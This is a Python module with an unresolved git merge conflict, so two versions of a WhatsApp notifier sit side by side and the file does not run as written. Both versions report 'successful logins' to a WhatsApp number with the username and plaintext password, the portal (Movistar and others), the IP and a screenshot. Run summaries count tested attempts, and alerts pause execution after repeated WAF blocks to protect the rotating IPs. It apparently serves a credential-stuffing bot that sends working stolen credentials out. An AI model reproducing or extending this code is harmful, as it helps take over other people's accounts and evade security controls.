"""
<<<<<<< HEAD
Módulo de Notificaciones WhatsApp (whatsapp_notifier.py)
=========================================================
Proporciona métodos reutilizables para enviar alertas, mensajes de texto
y notificaciones de login exitoso a través de WhatsApp Web utilizando
la sesión autenticada con configurarwhatsapp.py.

Uso:
  from whatsapp_notifier import enviar_whatsapp, notificar_login_exitoso, notificar_resumen
  
  # Enviar texto simple:
  enviar_whatsapp("Hola, prueba desde bot")
  
  # Notificar un login:
  notificar_login_exitoso(usuario="juan", contrasena="123", portal="Teletrabajo")
"""

import os
import sys
import time
import json
import logging
import threading
import urllib.parse
from pathlib import Path
from typing import Optional, Dict


# Rutas del módulo WhatsApp
PROJECT_DIR = Path(__file__).parent
DATAWP_DIR = PROJECT_DIR / "datawp"
SESSION_DIR = DATAWP_DIR / "whatsapp_session"
CONFIG_FILE = DATAWP_DIR / "whatsapp_config.json"


logger = logging.getLogger("WhatsAppNotifier")

# Motor de Navegador
try:
    from patchright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    HAS_BROWSER = True
except ImportError:
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
        HAS_BROWSER = True
    except ImportError:
        HAS_BROWSER = False


def esta_configurado() -> bool:
    """Verifica si WhatsApp ha sido configurado previamente con número y sesión."""
    if not CONFIG_FILE.exists() or not SESSION_DIR.exists():
        return False
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            cfg = json.load(f)
            return bool(cfg.get("numero_destino")) and cfg.get("activo", True)
    except Exception:
        return False


def obtener_numero_destino() -> Optional[str]:
    """Obtiene el número destino desde data/whatsapp_config.json."""
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                return cfg.get("numero_destino")
        except Exception:
            pass
    return None


_wa_lock = threading.Lock()


def enviar_whatsapp(
    mensaje: str,
    numero: Optional[str] = None,
    imagen_path: Optional[str] = None,
    timeout_s: int = 40
) -> bool:
    """
    Envía un mensaje de WhatsApp al número especificado (o al guardado por defecto).
    """
    if not HAS_BROWSER:
        logger.error("Playwright / Patchright no está disponible para enviar WhatsApp.")
        return False

    dest_num = numero or obtener_numero_destino()
    if not dest_num:
        logger.warning("No hay número de WhatsApp configurado. Ejecute 'python configurarwhatsapp.py'.")
        return False

    if not SESSION_DIR.exists():
        logger.warning(f"No existe sesión en {SESSION_DIR}. Ejecute 'python configurarwhatsapp.py'.")
        return False

    with _wa_lock:
        try:
            with sync_playwright() as p:
                browser_context = p.chromium.launch_persistent_context(
                    user_data_dir=str(SESSION_DIR),
                    headless=True,
                    viewport={"width": 1280, "height": 800},
                    args=["--no-sandbox", "--disable-dev-shm-usage"]
                )

                page = browser_context.pages[0] if browser_context.pages else browser_context.new_page()

                url_send = f"https://web.whatsapp.com/send?phone={dest_num}&text={urllib.parse.quote(mensaje)}"
                page.goto(url_send, wait_until="domcontentloaded", timeout=timeout_s * 1000)

                # Esperar a que cargue el chat
                time.sleep(4)

                # Si hay imagen para adjuntar
                if imagen_path and os.path.exists(imagen_path):
                    try:
                        # Clic en botón de adjuntar (+)
                        attach_btn = page.locator('div[title="Adjuntar"], span[data-icon="plus"]').first
                        if attach_btn.is_visible():
                            attach_btn.click()
                            time.sleep(1)
                            # Input de archivo
                            file_input = page.locator('input[accept*="image"]').first
                            file_input.set_input_files(imagen_path)
                            time.sleep(2)
                            # Botón enviar en vista previa de imagen
                            send_img_btn = page.locator('span[data-icon="send"]').first
                            if send_img_btn.is_visible():
                                send_img_btn.click()
                                time.sleep(3)
                                browser_context.close()
                                logger.info(f"✅ Mensaje con imagen enviado por WhatsApp a +{dest_num}")
                                return True
                    except Exception as e_img:
                        logger.warning(f"Error adjuntando imagen ({e_img}), enviando solo texto...")

                # Enviar mensaje de texto
                send_btn = page.locator('span[data-icon="send"]').first
                if send_btn.is_visible():
                    send_btn.click()
                else:
                    page.keyboard.press("Enter")

                time.sleep(3)
                browser_context.close()
                logger.info(f"✅ Mensaje enviado por WhatsApp a +{dest_num}")
                return True

        except Exception as e:
            logger.error(f"Error enviando WhatsApp: {e}")
            return False



def notificar_login_exitoso(
    usuario: str,
    contrasena: str,
    portal: str = "Visor Clientes",
    procedencia: str = "Interno",
    ip: str = "N/A",
    screenshot_path: Optional[str] = None
) -> bool:
    """Envía notificación formateada de credencial exitosa."""
    ahora = time.strftime("%Y-%m-%d %H:%M:%S")
    mensaje = (
        f"🎉 *¡LOGIN EXITOSO DETECTADO!*\n\n"
        f"📌 *Portal:* {portal}\n"
        f"👤 *Usuario:* `{usuario}`\n"
        f"🔑 *Contraseña:* `{contrasena}`\n"
        f"🏷️ *Procedencia:* {procedencia}\n"
        f"🌐 *IP:* {ip}\n"
        f"⏰ *Hora:* {ahora}\n"
    )
    return enviar_whatsapp(mensaje, imagen_path=screenshot_path)


def notificar_resumen(
    total: int,
    exitosos: int,
    fallidos: int,
    duracion: str,
    portal: str = "Movistar"
) -> bool:
    """Envía un resumen al finalizar la ejecución del bot."""
    mensaje = (
        f"📊 *RESUMEN DE EJECUCIÓN - {portal.upper()}*\n\n"
        f"🔢 *Total Pruebas:* {total}\n"
        f"✅ *Exitosos:* {exitosos}\n"
        f"❌ *Fallidos:* {fallidos}\n"
        f"⏱️ *Duración:* {duracion}\n"
        f"📅 *Fecha:* {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    )
    return enviar_whatsapp(mensaje)


def notificar_error_critico(
    portal: str,
    motivo: str,
    detalle: str,
    tarea_actual: Optional[Dict] = None,
    tareas_restantes: int = 0
) -> bool:
    """
    Envía notificación de error crítico cuando se detecta:
    - 2 WAF consecutivos
    - 2 pantallas en blanco consecutivas
    - 2 demoras excesivas / timeouts consecutivos
    """
    ahora = time.strftime("%Y-%m-%d %H:%M:%S")
    mensaje = (
        f"🚨 *ALERTA: ERROR CRÍTICO DETECTADO*\n\n"
        f"📌 *Portal:* {portal}\n"
        f"⚠️ *Motivo:* {motivo}\n"
        f"🔍 *Detalle:* {detalle}\n"
    )
    if tarea_actual:
        u_val = tarea_actual.get("usuario") or tarea_actual.get("u", "N/A")
        proc_val = tarea_actual.get("procedencia") or tarea_actual.get("t", "N/A")
        ip_val = tarea_actual.get("ip", "N/A")
        mensaje += (
            f"👤 *Usuario afectado:* `{u_val}` ({proc_val})\n"
            f"🌐 *IP:* {ip_val}\n"
        )
    mensaje += (
        f"📊 *Tareas restantes guardadas en memoria:* {tareas_restantes}\n"
        f"⏰ *Hora:* {ahora}\n\n"
        f"⏸️ *La ejecución se ha pausado para proteger las IPs y cuentas.*\n"
        f"💡 Puede reanudar la ejecución desde `python ejecutar.py`."
    )
    return enviar_whatsapp(mensaje)



# ============================================================
# CLASE DE COMPATIBILIDAD CON CÓDIGO PREVIO
# ============================================================
class WhatsAppNotifier:
    """Clase wrapper para mantener compatibilidad con main.py y otros módulos."""

    def __init__(self, bridge_port: int = 3456, whatsapp_module_dir: str = None):
        self.activo = esta_configurado()
        self.bridge_process = None

    def notify_login(self, procedencia: str, usuario: str, contraseña: str,
                     screenshot: str = None, ip: str = "N/A") -> bool:
        return notificar_login_exitoso(
            usuario=usuario,
            contrasena=contraseña,
            procedencia=procedencia,
            ip=ip,
            screenshot_path=screenshot
        )

    def notify_summary(self, total: int, exitosos: int, fallidos: int, duration: str) -> bool:
        return notificar_resumen(
            total=total,
            exitosos=exitosos,
            fallidos=fallidos,
            duracion=duration
        )

    def stop_bridge(self):
        pass


if __name__ == "__main__":
    if esta_configurado():
        print(f"✅ WhatsApp configurado con número: +{obtener_numero_destino()}")
        enviar_whatsapp("🔔 Prueba de envío desde whatsapp_notifier.py")
    else:
        print("⚠️ WhatsApp no configurado. Ejecute: python configurarwhatsapp.py")
=======
Módulo de Notificaciones WhatsApp (Python Client)
==================================================
Cliente Python que se conecta al bridge de Baileys (Node.js)
via HTTP localhost para enviar notificaciones.

Opciones de configuración:
1. WhatsApp vía Baileys Bridge (recomendado, multimedia)
2. WhatsApp vía pywhatkit (fallback, solo texto, abre navegador)
"""

import logging
import requests
import json
import subprocess
import time
import os
import signal
from pathlib import Path
from typing import Optional, List, Dict

logger = logging.getLogger(__name__)


class WhatsAppNotifier:
    """Cliente de notificaciones WhatsApp."""

    def __init__(self, bridge_port: int = 3456, whatsapp_module_dir: str = None):
        self.bridge_url = f"http://localhost:{bridge_port}"
        self.bridge_port = bridge_port
        self.whatsapp_module_dir = Path(whatsapp_module_dir) if whatsapp_module_dir else None
        self.bridge_process = None
        self.connected = False

    def start_bridge(self, phone_numbers: List[str] = None, wait_timeout: int = 60) -> bool:
        """
        Inicia el bridge de Baileys como proceso Node.js.

        Args:
            phone_numbers: Lista de números WhatsApp destino
            wait_timeout: Segundos máximos de espera para conexión

        Returns:
            True si el bridge se inició correctamente
        """
        if not self.whatsapp_module_dir:
            logger.error("Directorio del módulo WhatsApp no configurado")
            return False

        bridge_script = self.whatsapp_module_dir / "whatsapp_bridge.mjs"
        if not bridge_script.exists():
            logger.error(f"No se encontró: {bridge_script}")
            return False

        # Verificar dependencias de Node.js
        node_modules = self.whatsapp_module_dir / "node_modules"
        if not node_modules.exists():
            logger.info("Instalando dependencias de WhatsApp...")
            try:
                subprocess.run(
                    ["npm", "install"],
                    cwd=str(self.whatsapp_module_dir),
                    capture_output=True, timeout=120
                )
            except Exception as e:
                logger.error(f"Error instalando dependencias: {e}")
                return False

        # Construir comando
        cmd = ["node", str(bridge_script)]
        if phone_numbers:
            phones_str = ",".join(phone_numbers)
            cmd.append(f"--phone={phones_str}")

        # Crear archivo de config con números
        if phone_numbers:
            config_file = self.whatsapp_module_dir / "whatsapp_config.json"
            with open(config_file, "w") as f:
                json.dump({"target_numbers": phone_numbers}, f)

        # Iniciar proceso
        logger.info(f"Iniciando WhatsApp Bridge en puerto {self.bridge_port}...")
        try:
            self.bridge_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=str(self.whatsapp_module_dir),
                preexec_fn=os.setsid if os.name == 'posix' else None
            )
            logger.info(f"Bridge PID: {self.bridge_process.pid}")

            # Esperar a que esté listo
            start_time = time.time()
            while time.time() - start_time < wait_timeout:
                try:
                    resp = requests.get(f"{self.bridge_url}/status", timeout=3)
                    status = resp.json()
                    self.connected = status.get("connected", False)

                    if self.connected:
                        logger.info("✅ WhatsApp Bridge conectado y listo")
                        return True
                    else:
                        logger.info("⏳ Bridge iniciado, esperando escaneo de QR...")
                        return True  # Bridge corriendo pero necesita QR scan

                except requests.ConnectionError:
                    time.sleep(2)
                except Exception as e:
                    logger.warning(f"Verificando estado: {e}")
                    time.sleep(2)

            logger.warning("Timeout esperando bridge")
            return True  # El proceso sigue, quizás necesita QR

        except Exception as e:
            logger.error(f"Error iniciando bridge: {e}")
            return False

    def stop_bridge(self):
        """Detiene el bridge de Baileys."""
        try:
            # Enviar shutdown
            requests.post(f"{self.bridge_url}/shutdown", timeout=5)
        except Exception:
            pass

        # Matar proceso
        if self.bridge_process:
            try:
                if os.name == 'posix':
                    os.killpg(os.getpgid(self.bridge_process.pid), signal.SIGTERM)
                else:
                    self.bridge_process.terminate()
                self.bridge_process.wait(timeout=10)
            except Exception:
                try:
                    self.bridge_process.kill()
                except Exception:
                    pass
            self.bridge_process = None

        self.connected = False
        logger.info("Bridge detenido")

    def _post(self, endpoint: str, data: dict) -> bool:
        """Envía un POST al bridge."""
        try:
            resp = requests.post(f"{self.bridge_url}{endpoint}", json=data, timeout=15)
            result = resp.json()
            if resp.status_code == 200:
                return True
            else:
                logger.warning(f"Error en {endpoint}: {result.get('error', 'unknown')}")
                return False
        except requests.ConnectionError:
            logger.warning("Bridge no disponible - ¿está corriendo?")
            return False
        except Exception as e:
            logger.error(f"Error enviando notificación: {e}")
            return False

    def get_status(self) -> dict:
        """Obtiene el estado del bridge."""
        try:
            resp = requests.get(f"{self.bridge_url}/status", timeout=5)
            return resp.json()
        except Exception:
            return {"connected": False, "error": "bridge_offline"}

    def add_number(self, number: str) -> bool:
        """Agrega un número destino en runtime."""
        return self._post("/add-number", {"number": number})

    def send_message(self, number: str, text: str) -> bool:
        """Envía un mensaje de texto."""
        return self._post("/send", {"number": number, "text": text})

    def notify_login(self, procedencia: str, usuario: str, contraseña: str,
                    screenshot: str = None, ip: str = "N/A") -> bool:
        """Envía notificación de login exitoso con captura."""
        data = {
            "procedencia": procedencia,
            "usuario": usuario,
            "contraseña": contraseña,
            "screenshot": screenshot,
            "ip": ip
        }
        return self._post("/notify-login", data)

    def notify_error(self, procedencia: str, usuario: str, contraseña: str,
                    error: str, ip: str = "N/A") -> bool:
        """Envía notificación de error."""
        data = {
            "procedencia": procedencia,
            "usuario": usuario,
            "contraseña": contraseña,
            "error": error,
            "ip": ip
        }
        return self._post("/notify-error", data)

    def notify_summary(self, total: int, exitosos: int, fallidos: int, duration: str) -> bool:
        """Envía resumen de la ejecución."""
        return self._post("/notify-summary", {
            "total": total,
            "exitosos": exitosos,
            "fallidos": fallidos,
            "duration": duration
        })


# ===== FALLBACK: pywhatkit (solo texto, abre navegador) =====
class WhatsAppFallback:
    """Fallback usando pywhatkit (envía vía navegador web de WhatsApp)."""

    def __init__(self, country_code: int = 51):
        self.country_code = country_code

    def send_message(self, phone: str, message: str, wait_time: int = 15) -> bool:
        """Envía mensaje usando pywhatkit."""
        try:
            import pywhatkit as kit
            kit.sendwhatmsg_instantly(
                phone=f"+{self.country_code}{phone}",
                msg=message,
                wait_time=wait_time,
                tab_close=True,
                close_after_wait=wait_time + 5
            )
            return True
        except ImportError:
            logger.error("pywhatkit no instalado. Instalar con: pip install pywhatkit")
            return False
        except Exception as e:
            logger.error(f"Error con pywhatkit: {e}")
            return False

    def notify_login(self, procedencia: str, usuario: str, contraseña: str,
                    screenshot: str = None, ip: str = "N/A", phone: str = None) -> bool:
        if not phone:
            logger.error("Número de teléfono requerido para fallback")
            return False

        msg = (f"🔐 LOGIN EXITOSO - MOVISTAR\n\n"
               f"Procedencia: {procedencia}\n"
               f"Usuario: {usuario}\n"
               f"Contraseña: {contraseña}\n"
               f"IP: {ip}\n"
               f"Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        return self.send_message(phone, msg)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    notifier = WhatsAppNotifier(bridge_port=3456,
                                whatsapp_module_dir=str(Path(__file__).parent))

    # Test de conexión
    status = notifier.get_status()
    print(json.dumps(status, indent=2))

    if not status.get("connected"):
        print("\nIniciando bridge...")
        notifier.start_bridge(phone_numbers=["999999999"])  # Cambiar por tu número
        time.sleep(5)
        status = notifier.get_status()
        print(json.dumps(status, indent=2))

    notifier.stop_bridge()
>>>>>>> 896283b8ed693c96dfe6c769ed049a4dc051282d
